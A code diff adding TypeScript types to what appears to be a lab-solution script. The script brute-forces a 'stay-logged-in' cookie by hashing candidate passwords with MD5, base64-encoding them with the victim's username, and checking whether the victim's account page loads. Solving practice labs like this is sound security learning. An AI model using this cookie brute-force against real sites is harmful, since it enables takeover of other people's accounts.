@@ -11,10 +11,10 @@ const { labUrl, concurrencyLimit, httpClient } = getParsedInputFromUser({
 });
 
 const passwords = await getPasswords();
-const tasks = passwords.map((password) => () => task(password));
+const tasks = passwords.map((password: string) => () => task(password));
 runTasks(tasks, concurrencyLimit);
 
-async function task(password) {
+async function task(password: string) {
   const resp = await httpClient.get(labUrl, {
     headers: {
       cookie: getCookie(password),
@@ -32,7 +32,7 @@ async function task(password) {
   }
 }
 
-function getCookie(password) {
+function getCookie(password: string) {
   const hash = md5(password);
   const value = Buffer.from(`${victimsAccount.username}:${hash}`).toString(
     "base64",
@@ -40,6 +40,6 @@ function getCookie(password) {
   return "stay-logged-in=" + value;
 }
 
-function isLoggedIn(html) {
+function isLoggedIn(html: string) {
   return html.includes(`my-account?id=${victimsAccount.username}`);
 }
